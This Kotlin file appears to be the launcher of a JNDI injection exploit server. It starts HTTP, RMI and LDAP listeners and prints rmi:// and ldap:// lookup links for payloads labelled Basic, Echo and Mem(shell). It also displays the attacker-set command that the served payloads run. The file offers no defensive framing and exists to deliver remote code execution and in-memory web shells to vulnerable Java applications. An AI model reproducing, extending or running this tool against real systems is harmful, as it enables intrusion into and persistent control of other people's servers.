import http.HTTPServer
import ldap.LDAPServer
import rmi.RMIServer
import util.Options
import util.green
import util.purple
import kotlin.concurrent.thread
import kotlin.system.exitProcess

fun main(args: Array<String>) {
    Options.init(args)

    with(Options) {
        if (helpInfo) {
            println("Try the following links ;)".green())
            Class.forName("rmi.PayloadsKt").declaredMethods
                .map { if (it.name == "ref") "${it.name}/[Basic|Echo|Mem]" else it.name }
                .forEach { println("rmi://$address:$rmiPort/$it") }

            Class.forName("ldap.PayloadsKt").declaredMethods
                .map { if (it.name == "ref") "${it.name}/[Basic|Echo|Mem]" else it.name }
                .forEach { println("ldap://$address:$ldapPort/$it") }

            exitProcess(0)
        }
        println("""
            |Address: $address
            |Command: $command
            |Payload: Echo -> $echo / Memshell -> $memshell
            |
        """.trimMargin().green())
    }

    // startup all servers
    thread { HTTPServer().run() }
    thread { RMIServer().run() }
    thread { LDAPServer().run() }
}
